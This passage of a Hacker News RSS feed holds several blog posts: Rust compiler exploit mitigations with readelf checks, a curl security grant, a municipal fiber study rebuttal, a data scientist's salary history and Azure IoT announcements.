<p>Fig. 3.‚ÄÉBuild and execution of hello-rust-integer with debug assertions
enabled.</p>

<div><div><pre><code>$ cargo run --release
   Compiling hello-rust-integer v0.1.0 (/home/rcvalle/hello-rust-integer)
    Finished release [optimized] target(s) in 0.23s
     Running `target/release/hello-rust-integer`
u: 0
</code></pre></div></div>
<p>Fig. 4.‚ÄÉBuild and execution of hello-rust-integer with debug assertions
disabled.</p>

<p>Integer overflow checks are enabled when debug assertions are enabled (see
Fig. 3), and disabled when debug assertions are disabled (see Fig. 4). To
enable integer overflow checks independently, use the option to control
integer overflow checks, scoped attributes, or explicit checking methods
such as <code>checked_add</code><sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

<p>It is recommended that explicit wrapping methods such as <code>wrapping_add</code> be
used when wrapping semantics are intended, and that explicit checking and
wrapping methods always be used when using Unsafe Rust.</p>

<p id="fn:2">2. See <a href="https://doc.rust-lang.org/std/primitive.u32.html">https://doc.rust-lang.org/std/primitive.u32.html</a> for more
information on the checked, overflowing, saturating, and wrapping methods
(using u32 as an example). <a href="#fnref:2" role="doc-backlink">‚Ü©</a></p>

<h3 id="non-executable-memory-regions">Non-executable memory regions</h3>

<p>Non-executable memory regions increase the difficulty of exploitation by
limiting the memory regions that can be used to execute arbitrary code. Most
modern processors provide support for the operating system to mark memory
regions as non executable, but it was previously emulated by software, such
as in grsecurity/PaX
<a href="https://pax.grsecurity.net/docs/pageexec.txt">PAGEEXEC</a> and
<a href="https://pax.grsecurity.net/docs/segmexec.txt">SEGMEXEC</a>, on processors that
did not provide support for it. This is also known as ‚ÄúNo Execute (NX) Bit‚Äù,
‚ÄúExecute Disable (XD) Bit‚Äù, ‚ÄúExecute Never (XN) Bit‚Äù, and others.</p>

<p>The Rust compiler supports non-executable memory regions, and enables it by
default since its initial release, version 0.1 (2012-01-20)[21], [22], but
has regressed since then[23]‚Äì[25], and enforced by default since version
1.8.0 (2016-04-14)[25].</p>

<div><div><pre><code>$ readelf -l target/release/hello-rust | grep -A 1 GNU_STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
</code></pre></div></div>
<p>Fig. 5.‚ÄÉChecking if non-executable memory regions are enabled for a given
binary.</p>

<p>The presence of an element of type <code>PT_GNU_STACK</code> in the program header
table with the <code>PF_X</code> (i.e., executable) flag unset indicates non-executable
memory regions<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> are enabled for a given binary (see Fig. 5).
Conversely, the presence of an element of type <code>PT_GNU_STACK</code> in the program
header table with the <code>PF_X</code> flag set or the absence of an element of type
<code>PT_GNU_STACK</code> in the program header table indicates non-executable memory
regions are not enabled for a given binary.</p>

<p id="fn:3">3. See the Appendix section for more information on why it affects other
memory regions besides the stack. <a href="#fnref:3" role="doc-backlink">‚Ü©</a></p>

<h3 id="stack-clashing-protection">Stack clashing protection</h3>

<p>Stack clashing protection protects the stack from overlapping with another
memory region‚Äîallowing arbitrary data in both to be overwritten using each
other‚Äîby reading from the stack pages as the stack grows to cause a page
fault when attempting to read from the guard page/region. This is also
referred to as ‚Äústack probes‚Äù or ‚Äústack probing‚Äù.</p>

<p>The Rust compiler supports stack clashing protection via stack probing, and
enables it by default since version 1.20.0 (2017-08-31)[26]‚Äì[29].</p>

<p><img src="https://rcvalle.blog/assets/2020/09/16/rust-lang-exploit-mitigations/image1.png" alt="Screenshot listing cross references to __rust_probestack in hello-rust." title="Cross references to __rust_probestack in hello-rust.">
Fig. 6. Cross references to <code>__rust_probestack</code> in hello-rust.</p>

<div><div><pre><code><span>fn</span> <span>hello</span><span>()</span> <span>{</span>
    <span>println!</span><span>(</span><span>"Hello, world!"</span><span>);</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>_</span><span>:</span> <span>[</span><span>u64</span><span>;</span> <span>1024</span><span>]</span> <span>=</span> <span>[</span><span>0</span><span>;</span> <span>1024</span><span>];</span>
    <span>hello</span><span>();</span>
<span>}</span>
</code></pre></div></div>
<p>Fig 7. Modified hello-rust.</p>

<p><img src="https://rcvalle.blog/assets/2020/09/16/rust-lang-exploit-mitigations/image2.png" alt="Screenshot listing cross references to __rust_probestack in modified hello-rust." title="Cross references to __rust_probestack in modified hello-rust.">
Fig. 8. Cross references to <code>__rust_probestack</code> in modified hello-rust.</p>

<p>To check if stack clashing protection is enabled for a given binary, search
for cross references to <code>__rust_probestack</code>. The <code>__rust_probestack</code> is
called in the prologue of functions whose stack size is larger than a page
size (see Fig. 6), and can be forced for illustration purposes by modifying
the hello-rust example as seen in Fig. 7 and Fig. 8.</p>

<h3 id="read-only-relocations-and-immediate-binding">Read-only relocations and immediate binding</h3>

<p><strong>Read-only relocations</strong> protect segments containing relocations and
relocation information (i.e., <code>.init_array</code>, <code>.fini_array</code>, <code>.dynamic</code>, and
<code>.got</code>) from being overwritten by marking these segments read only. This is
also referred to as ‚Äúpartial RELRO‚Äù.</p>

<p>The Rust compiler supports read-only relocations, and enables it by default
since version 1.21.0 (2017-10-12)[30], [31].</p>

<div><div><pre><code>$ readelf -l target/release/hello-rust | grep GNU_RELRO
  GNU_RELRO      0x000000000002ee00 0x000000000002fe00 0x000000000002fe00
</code></pre></div></div>
<p>Fig. 9.‚ÄÉChecking if read-only relocations is enabled for a given binary.</p>

<p>The presence of an element of type <code>PT_GNU_RELRO</code> in the program header
table indicates read-only relocations are enabled for a given binary (see
Fig. 9). Conversely, the absence of an element of type <code>PT_GNU_RELRO</code> in the
program header table indicates read-only relocations are not enabled for a
given binary.</p>

<p><strong>Immediate binding</strong> protects additional segments containing relocations
(i.e., <code>.got.plt</code>) from being overwritten by instructing the dynamic linker
to perform all relocations before transferring control to the program during
startup so all segments containing relocations can be marked read only (when
combined with read-only ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/">https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/</a></em></p>]]>
            </description>
            <link>https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575844</guid>
            <pubDate>Thu, 24 Sep 2020 06:25:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Google Grant for Libcurl Work]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24575819">thread link</a>) | @gilad
<br/>
September 23, 2020 | https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Earlier this year I was the recipient of a monetary <a rel="noreferrer noopener" href="https://www.google.com/about/appsecurity/patch-rewards/" target="_blank">Google patch grant</a> with the expressed purpose of <strong>improving security in libcurl</strong>.</p>



<p>This was an upfront payout under this Google program describing itself as ‚Äúan experimental program that rewards proactive security improvements to select open-source projects‚Äù.</p>



<p>I accepted this grant for the curl project and <strong>I intend to keep working fiercely on securing curl</strong>. I recognize the importance of curl security as curl remains one of the most widely used software components in the world, and even one that is doing network data transfers which typically is a risky business. curl is responsible for a <a href="https://daniel.haxx.se/blog/2019/12/04/daily-web-traffic/">measurable share</a> of all Internet transfers done over the Internet an average day. My job is to make sure those transfers are done as safe and secure as possible. It isn‚Äôt my <em>only</em> responsibility of course, as I have other tasks to attend to as well, but still.</p>



<h2>Do more</h2>



<p>Security is already and always a top priority in the curl project and for myself personally. This grant will of course further my efforts to strengthen curl and by association, all the many users of it.</p>



<h2>What I will not do</h2>



<p>When security comes up in relation to curl, some people like to mention and propagate for other programming languages, But <strong>curl will not be rewritten in another language</strong>. Instead we will increase our efforts in writing good C and detecting problems in our code earlier and better.</p>



<h2>Proactive counter-measures</h2>



<p>Things we have done lately and working on to enforce everywhere:</p>



<p><strong>String and buffer size limits</strong> ‚Äì all string inputs and all buffers in libcurl that are allowed to grow now have a maximum allowed size, that makes sense. This stops malicious uses that could make things grow out of control and it helps detecting programming mistakes that would lead to the same problems. Also, by making sure strings and buffers are never ridiculously large, we avoid a whole class of integer overflow risks better.</p>



<p><strong>Unified dynamic buffer functions</strong> ‚Äì by reducing the number of different implementations that handle ‚Äúgrowing buffers‚Äù we reduce the risk of a bug in one of them, even if it is used rarely or the spot is hard to reach with and ‚Äúexercise‚Äù by the fuzzers. The ‚Äúdynbuf‚Äù internal API first shipped in curl 7.71.0 (June 2020).</p>



<p><strong>Realloc buffer growth unification</strong> ‚Äì pretty much the same point as the previous, but we have earlier in our history had several issues when we had silly realloc() treatment that could lead to bad things. By limiting string sizes and unifying the buffer functions, we have reduced the number of places we use realloc and thus we reduce the number of places risking new realloc mistakes. The realloc mistakes were usually in combination with integer overflows.</p>



<p><strong>Code style</strong> ‚Äì we‚Äôve gradually improved our code style checker (<code>checksrc.pl</code>) over time and we‚Äôve also gradually made our code style more strict, leading to less variations in code, in white spacing and in naming. I‚Äôm a firm believer this makes the code look more coherent and therefore become more readable which leads to fewer bugs and easier to debug code. It also makes it easier to grep and search for code as you have fewer variations to scan for.</p>



<p><strong>More code analyzers</strong> ‚Äì we run every commit and PR through a large number of code analyzers to help us catch mistakes early, and we always remove detected problems. Analyzers used at the time of this writing: lgtm.com, Codacy, Deepcode AI, Monocle AI, clang tidy, scan-build, CodeQL, Muse and Coverity. That‚Äôs of course in addition to the regular run-time tools such as valgrind and sanitizer builds that run the entire test suite.</p>



<p><strong>Memory-safe components</strong> ‚Äì curl already supports getting built with a plethora of different libraries and ‚Äúbackends‚Äù to cater for users‚Äô needs and desires. By properly supporting and offering users to build with components that are written in for example rust ‚Äì or other languages that help developers avoid pitfalls ‚Äì future curl and libcurl builds could potentially avoid a whole section of risks. (Stay tuned for more on this topic in a near future.)</p>



<h2>Reactive measures</h2>



<p>Recognizing that whatever we do and however tight ship we run, <strong>we will continue to slip every once in a while</strong>, is important and we should make sure we find and fix such slip-ups as good and early as possible.</p>



<p><strong>Raising bounty rewards</strong>. While not directly fixing things, offering more money in <a href="https://hackerone.com/curl">our bug-bounty program</a> helps us get more attention from security researchers. Our ambition is to gently drive up the reward amounts progressively to perhaps multi-thousand dollars per flaw, as long as we have funds to pay for them and we mange keep the security vulnerabilities at a reasonably low frequency.</p>



<p><strong>More fuzzing</strong>. I‚Äôve said it before but let me say it again: fuzzing is really the top method to find problems in curl once we‚Äôve fixed all flaws that the static analyzers we use have pointed out.  The primary fuzzing for curl is done by OSS-Fuzz, that tirelessly keeps hammering on the most recent curl code.</p>



<p>Good fuzzing needs a certain degree of ‚Äúhand-holding‚Äù to allow it to really test all the APIs and dig into the dustiest corners, and we should work on adding more ‚Äúprobes‚Äù and entry-points into libcurl for the fuzzer to make it exercise more code paths to potentially detect more mistakes.</p>



<p>See also my presentation <a href="https://daniel.haxx.se/blog/2020/07/02/video-testing-curl-for-security/">testing curl for security</a>.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575819</guid>
            <pubDate>Thu, 24 Sep 2020 06:20:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Updated Analysis of UPenn 'Muncipal Fiber in the U.S.' Study]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24575516">thread link</a>) | @onionjake
<br/>
September 23, 2020 | https://www.yeskaysvillefiber.com/blog/upenn-study | <a href="https://web.archive.org/web/*/https://www.yeskaysvillefiber.com/blog/upenn-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7b877f25b8cd4b330ade"><div><blockquote><p>Opponents of Kaysville Fiber keep referring to a UPenn study to state that the project is highly likely to fail financially. Is this true?</p></blockquote><p>No. Using the UPenn study as a tool to evaluate Kaysville Fiber‚Äôs long term success ignores the limitations of the study that the authors themselves expressly point out. When looking at the study in context of its actual methods and limitations, it is clear that it has little to no predictive value on which to judge Kaysville Fiber.</p><h4>Limitation of the UPenn Study</h4><p>The study reviewed 20 projects out of 330 currently in operation nationwide (a sample size of 6%), and only 5 years of cash flows for those projects. As the authors themselves caution in the study, it was extremely limited to data for just a small amount of projects over a narrow window of time.</p><p>Municipal fiber infrastructure is a very long term investment and cities generally plan to recoup their cost of infrastructure over 20 to 30 years. Financing and customer rates are generally designed to line up with this type of time period. So if you were to look at the overall cash flow related to the project, you would see a large outlay of cash while the project is constructed, and then you would see the steady recuperation of that cost over 20 to 30 years.</p><p>This creates a large problem when you are limited in scope to only 5 years, as is the case for the UPenn study. The study takes a five year period for 20 projects, which include large amounts of capital investment in the network infrastructure (which it treats as ongoing operating cash flow), and then calculates how long it would take to payback the full project cost using that 5 year window as the assumed cash flow going forward.&nbsp; The results of this limited scope analysis shows that 18 of the 20 projects would not be self sustaining.&nbsp;These results are not surprising given the methods described. Most infrastructure heavy endeavors across industries would show similar results.</p><h4>Updating the Data</h4><p>Since the study only looks at financial performance through 2014, we decided to see what has happened since. The result? In just five more years, a substantial amount of projects that UPenn suggested would indefinitely struggle have now paid back or are on track to payback ahead of schedule. Just four of the original 18 projects that UPenn concluded were unsustainable remain so. We suspect that with more time (per typical project design with long term assets) these projects will also improve. Here are some examples of how inaccurate the UPenn results turned out. For each of these projects, UPenn suggested it would take centuries to payback (if ever):</p><ul data-rte-list="default"><li><p>Chattanooga generated $377M on their $162M project in 10 years. </p></li><li><p>Wilson and Pulaski are five years from paying off&nbsp;debt. </p></li><li><p>Clarksville is two years from paying off debt. </p></li></ul><p>The bottom line, the study is not useful to predict success of municipal fiber projects. The study does show that if you expect to payoff your debt over a 5 year period of time, that is likely not going to happen (though half of the projects surprisingly did show positive cash flow in their five year windows).</p><p>The full results are shown at the end of this post.</p><p>Needless to say, this study is outdated and has not aged well. The authors have indicated that they would update their analysis as more information becomes available. With several more years of audited financial reports released, they have yet to provide an update.</p><p>As residents evaluate whether Kaysville should pursue its fiber project or not, it is important that we use relevant and reliable information. This particular study falls short.</p><p>Summary Results below. Full spreadsheet can be downloaded at <a href="https://www.yeskaysvillefiber.com/s/Penn-Law-Study-Update-Spreadsheet.xlsx" target="_blank">here</a>.</p></div></div></div>]]>
            </description>
            <link>https://www.yeskaysvillefiber.com/blog/upenn-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575516</guid>
            <pubDate>Thu, 24 Sep 2020 05:26:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How much I made as a data scientist]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574928">thread link</a>) | @data4lyfe
<br/>
September 23, 2020 | https://www.interviewquery.com/blog-data-science-salaries/ | <a href="https://web.archive.org/web/*/https://www.interviewquery.com/blog-data-science-salaries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.interviewquery.com/content/images/size/w300/2020/09/software-developer-3182374_1280.jpg 300w,
                            https://www.interviewquery.com/content/images/size/w600/2020/09/software-developer-3182374_1280.jpg 600w,
                            https://www.interviewquery.com/content/images/size/w1000/2020/09/software-developer-3182374_1280.jpg 1000w,
                            https://www.interviewquery.com/content/images/size/w2000/2020/09/software-developer-3182374_1280.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.interviewquery.com/content/images/size/w2000/2020/09/software-developer-3182374_1280.jpg" alt="How Much Do Data Scientists Make? (My Journey)">
            </figure>

            <section>
                <div>
                    <!--kg-card-begin: html--><!--kg-card-end: html--><p>Today, we‚Äôre talking about data science salaries. </p><p>Obviously, this is a huge‚Äì and typically taboo‚Äì question to ask just anyone, so in the spirit of full transparency, I‚Äôll be telling you how much I‚Äôve made in all of my data science positions ever since I‚Äôve graduated. <br></p><p>First of all, let‚Äôs cover some basics. Your pay will <em>very much </em>depend on the company you‚Äôre working for, with respect to their size, how much funding they‚Äôre willing to allocate to you, and lots of other factors. And it also depends on you‚Äì your experiences, your career progression, and how much money really matters to you (pertaining to the position you apply for). </p><p>For context on the figures I‚Äôm about to introduce, let‚Äôs take a look at some industry statistics. Today, Glassdoor lists the mean annual data science salary to be $112,000. Indeed has an average salary of $120,000, while PayScale comes in a bit lower with $95,000. </p><p>On the other end of the scale, <a href="https://www.levels.fyi/comp.html?track=Data%20Scientist">levels.fyi </a>has a data science salary median of $150,000, and an insane $238,000 median coming from those in the San Francisco Bay Area. Out of curiosity‚Äìand sheer disbelief‚Äì I tried submitting a fake salary of $400k, and they still accepted it, so who knows? </p><h2 id="first-data-science-salary-offer-out-of-college">First Data Science Salary Offer Out of College</h2><p>After graduating college in 2015, I had two different job offers waiting for me. </p><p>The first was from a company called Workday, and they offered me a <strong>$95,000 base salary and $60,000 over four years in terms of stock</strong>. For total compensation, this equals out to about $110,000 annually. The position they needed to fill was actually for a Software Engineer in Performance, which is ultimately‚Äìspoiler alert‚Äì why I didn‚Äôt end up taking the job. </p><p>The second offer came from Inflection, and they were looking for a marketing analyst, extending <strong>a base salary of $85,000 with a $5000 sign-on bonus</strong>. </p><p>So why did I end up taking a $25,000 pay-cut in accepting one offer over the other? </p><p>Well, when I interviewed at Workday right out of college, they actually didn‚Äôt ask me any technical questions. The interview was very casual‚Äì we laughed and joked around, and mostly talked about projects I had worked on in the past.</p><p>Ultimately, while I was really happy with the offer (making six figures out of college was <em>insane </em>to me), I thought that the marketing analyst role would be more helpful for later transitioning to data science, and I was also a lot more excited to learn from my boss at Inflection. </p><p><em>If you're interested in how I landed my <a href="https://www.interviewquery.com/blog-new-grad-guide-on-landing-data-science-job/">first data science job out of college</a>, check out my new grad data science guide and my youtube video on l<a href="https://www.youtube.com/watch?v=7v_Szio9r3E">anding a data science job without experience</a>!</em></p><h2 id="first-data-scientist-position-salary">First Data Scientist Position Salary<br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/INF_logo_2015.png" alt="My data science salary at Inflection (pictured) was around $85,000/year. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/INF_logo_2015.png 600w, https://blog.interviewquery.com/content/images/2020/09/INF_logo_2015.png 610w"><figcaption>Image from <a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fduo.com%2Fuse-cases%2Fcase-studies%2Finflection&amp;psig=AOvVaw1lJKdBCQA_Cc3S8bCZ-dpS&amp;ust=1600470045417000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCOC53Nal8esCFQAAAAAdAAAAABAd"><em>Google Images</em></a></figcaption></figure><p>So as a new grad, I was making around $85k a year in the San Francisco Bay Area, which is definitely a really expensive place to live. My take-home pay after tax and everything was around $4000 a month, so, as you can imagine, I didn‚Äôt have a lot of savings left over. </p><p>Very quickly, I realized that this was the minimum amount I needed to survive. As someone new to the workforce that hasn‚Äôt seen that much money before, it can be a little distorting to see those big numbers and having it end up being much less in real-life, but I saw this as a good opportunity anyway for a new grad. <br></p><p>However, after working at Inflection for around three to four months, I started to feel like the company wasn‚Äôt really for me. I wasn‚Äôt learning a whole lot, and my boss ended up leaving in the first two weeks, so I decided to leave after a few months to seek out other opportunities.</p><p>At this point, I was kicking myself for not taking that position at Workday, but I ended up taking a new job with Jobr, which is actually where I found the position. They reached out to me with a data scientist position (specifically working with the recommendation algorithm), and eventually an offer came in for <strong>$80,000 with 0.5% equity, so my base pay would be cut by $5k</strong>. </p><p>Equity works based on the evaluation of the company at that time, which was around $10 million. Jobr raised $2 million with that evaluation, so my 0.5% cut of equity meant that I was entitled to around $50,000 over the course of four years, with the possibility of that value increasing. </p><p>Inside my employment contract, they had also included a clause that if they had raised the Series A, my base salary would go up to $100,000 once that Series A had gone through. </p><p>At this point, I kind of felt like I‚Äôd be stupid <em>not to take the job </em>because no one else was really interested in hiring me. </p><h2 id="startup-acquisition-how-much-did-i-make">Startup Acquisition: How Much Did I Make?<br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg" alt="After moving over to work for Jobr, my data science base salary increased from $80k to $110k." srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg 600w, https://blog.interviewquery.com/content/images/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg 658w"><figcaption>Image from <a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.producthunt.com%2Fposts%2Fjobr&amp;psig=AOvVaw1BGKqJRJtQRFJl47LG6onm&amp;ust=1600470194602000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCKCW-J2m8esCFQAAAAAdAAAAABAY"><em>Google Images</em></a></figcaption></figure><p>So here‚Äôs where a bit of luck came into play. After six months of working at my job, Jobr was acquired for $12.5 million by Monster, who was looking at my company‚Äôs Tinder-for-jobs kind of app. Using that value, you‚Äôd think that I‚Äôd hit the jackpot with my share of equity at around $62,500. Unfortunately, no. </p><p>If you‚Äôre unfamiliar with acquisitions, basically when a larger company consumes a smaller one, there's a lot of lawyers, brokers, investors, and other middle-men involved. All in all, you can expect around a third of the amount you‚Äôre originally supposed to get to go to a bunch of different people, even if it‚Äôs above the evaluation the company raised (as it was in this case). </p><p>Pre-tax, I ended up taking home around $40,000, rounding up my first year with Jobr to be around $150,000. </p><p>To summarize, I guess the lesson here is that it‚Äôs important to continually develop your skills, as that‚Äôs what you‚Äôre being hired for. <strong>Money comes later (with a little bit of luck!), but it helps to set yourself up for success first in your current environment. </strong></p><p>So after acquisition, earnout was also given out. Basically, revenue targets are set for certain metrics, and if you hit those, you can end up earning more from the acquisition. With the way it was written out in my contract, I‚Äôd basically be able to receive another $40,000-$50,000 for every year after the acquisition.</p><p>We ended up forecasting that we‚Äôd hit around 90% of them, so my take-home ended up being around <strong>$150,000 annually</strong> after that first year. </p><p>In 2017, the whole company in Jobr negotiated a raise from the parent company, so I got bumped up to <strong>$130,000 base-pay, making my total compensation per year at that point to be $170,000. </strong></p><h2 id="my-last-data-science-salary-at-nextdoor">My Last Data Science Salary at Nextdoor <br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/media-logos-green.png" alt="My annual data science salary at Nextdoor decreased when I switched jobs again. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/media-logos-green.png 600w, https://blog.interviewquery.com/content/images/2020/09/media-logos-green.png 640w"></figure><p>In 2018, my third year out of college, I ended up switching jobs again. Everyone I had known originally at Jobr had left at this point, including my current co-founder Shane. The work culture had changed, and I really wanted to find another company that really fit and supported my needs. </p><p>I knew that my total compensation was likely to decrease unless I interviewed for larger companies, but my main focus at this point was finding a place that I really liked. </p><p>I signed up for Hired, and Nextdoor ended up reaching out to me after I set my base salary ($150,000) requirement. In hindsight, now that I‚Äôve learned a lot more about negotiation and interviewing, I don‚Äôt recommend using Hired. Once you set your salary at a certain threshold, companies will end up using that when they‚Äôre negotiating with you, <strong>setting up a salary expectation that‚Äôs lower than what they can actually allocate to you</strong>. </p><p>In this way, it‚Äôs better to withhold salary expectations until the end of the interviewing process, but I still consider Hired a good place to get a job if you don‚Äôt actually want to go out there and apply for X number of positions. </p><p>So with Nextdoor, I went through the entire process (including the on-site interview), so I was having good feelings about the company when I met everyone. My offer ended up around $145,000, which is lower than what I expected given what I put in my Hired profile. </p><p>This was a <em>huge </em>indication to me that their intentions were to start lower so we could negotiate up. In the end, I negotiated up to $155,000 with a $20,000 sign-on bonus, so <strong>my total compensation for that first year was $175,000</strong>. My offer included some equity as well, but this is much harder to calculate with a long-term unicorn like Nextdoor, as you don‚Äôt really know when they‚Äôre going to exit. </p><p>Currently, I'm at InterviewQuery, definitely making less than $175,000 a year. If I were to estimate given my career progression if I had taken another data science job, I probably could have secured around $190,000 in base salary, or maybe even more if it were at Facebook, Google, or Amazon, etc. </p><h2 id="data-science-salary-tips-tricks">Data Science Salary: Tips &amp; Tricks</h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/freelance-1989333_1280.png" alt="Data Science salaries change by a variety of factors. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/freelance-1989333_1280.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2020/09/freelance-1989333_1280.png 1000w, https://blog.interviewquery.com/content/images/2020/09/freelance-1989333_1280.png 1280w" sizes="(min-width: 720px) 720px"><figcaption>Image from <em><a href="https://pixabay.com/vectors/freelance-work-job-making-money-1989333/">Pixabay</a></em></figcaption></figure><p>If you‚Äôre just about to be in the negotiation process or if you‚Äôre just looking to break in data science salary numbers, here‚Äôs some helpful rules that might change how you look at things. </p><h3 id="never-compare-yourself-to-others-">Never compare yourself to others. <br></h3><p>Honestly, this is just an unfair comparison overall. You would be doing yourself a disservice in trying to connect different data science salaries to other people who have different luck, experiences, and career trajectories. </p><h3 id="determine-your-own-market-value-">Determine your own market value. <br></h3><p>The general consensus is that you‚Äôre worth the amount for which you can be replaced by anyone else in the field. So, for instance, if you‚Äôre doing BI analysis as a data scientist, then you can essentially be replaced by a BI analyst at a lower salary. </p><p>In this way, it‚Äôs imperative to really understand what your role entails, as well as how you can grow, whether that involves becoming a manager, a technical lead, etc. </p><h3 id="figure-out-how-much-money-means-to-you-">Figure out how much money means to you. <br></h3><p>When I was walking in and out of work everyday, I didn‚Äôt feel like I was walking out of $100k, or $200k, or whatever that equivalent is per hour.</p><p>Understanding your goals (trying to retire or be financially independent versus being more focused on learning more) is incredibly important, as it dictates, ultimately, what kind of company you may end up working for, and as a result, the workplace environment and culture. </p><blockquote><em>If you're curious about the ‚Ä¶</em></blockquote></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.interviewquery.com/blog-data-science-salaries/">https://www.interviewquery.com/blog-data-science-salaries/</a></em></p>]]>
            </description>
            <link>https://www.interviewquery.com/blog-data-science-salaries/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574928</guid>
            <pubDate>Thu, 24 Sep 2020 03:22:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Azure IoT Announcements and Sessions from Microsoft Ignite 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574797">thread link</a>) | @crpietschmann
<br/>
September 23, 2020 | https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/ | <a href="https://web.archive.org/web/*/https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
<p>There have been a few great Azure IoT announcements and session made available by Microsoft as part of the Microsoft Ignite 2020 virtual conference. With the flood of information coming out of Microsoft Ignite 2020,  it can be difficult to parse out the specific announcements and sessions of interest, so here‚Äôs a list that‚Äôs focused solely on the topics of Azure IoT.</p>



<p>Let‚Äôs take a look at the top Azure IoT (Internet of Things) announcements from Microsoft Ignite 2020!</p>








<br><h2><span id="azure_iot_announcements"></span>Azure IoT Announcements<span></span></h2>



<br><h3><span id="azure_sql_edge,_optimized_for_iot_gateways_and_devices_now_ga"></span>Azure SQL Edge, Optimized for IoT Gateways and Devices now GA<span></span></h3>



<p>Azure SQL Edge, which&nbsp;brings the most secure Microsoft SQL data engine to&nbsp;Internet of Things (IoT)&nbsp;gateways and edge devices, is now available. Optimized for IoT workloads, SQL Edge supports built-in data streaming, storage and&nbsp;artificial intelligence&nbsp;packed into&nbsp;a&nbsp;small footprint container that works in connected or disconnected environments.</p>



<p>Built on the same code&nbsp;base as Microsoft SQL Server and Azure SQL, Azure SQL Edge provides the same industry-leading security, the same familiar developer experience, and the same tooling that many teams already know and&nbsp;trust. ‚Äã</p>



<p>Azure SQL Edge is a small-footprint container ‚Äî less than 500 megabytes ‚Äî running in ARM- and x64-based devices in connected, disconnected or semi-connected environments.</p>



<p><a href="https://aka.ms/AA9gi03" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h3><span id="new_azure_certified_device_program"></span>New Azure Certified Device Program<span></span></h3>



<p>A new Azure Certified Device program will streamline the experience of connecting the right device to the right solution through its Azure Certified Device Catalog, benefiting both device builders and solution builders.</p>



<p>For device builders, the certification reduces time to market, as they no longer&nbsp;have to&nbsp;use their own time and resources to&nbsp;verify, validate and communicate trust. For the solution builder and distributor, the certification ensures&nbsp;both&nbsp;quality and compatibility.</p>



<p>The catalog will highlight device compatibility and differentiation&nbsp;through three Azure certifications:</p>



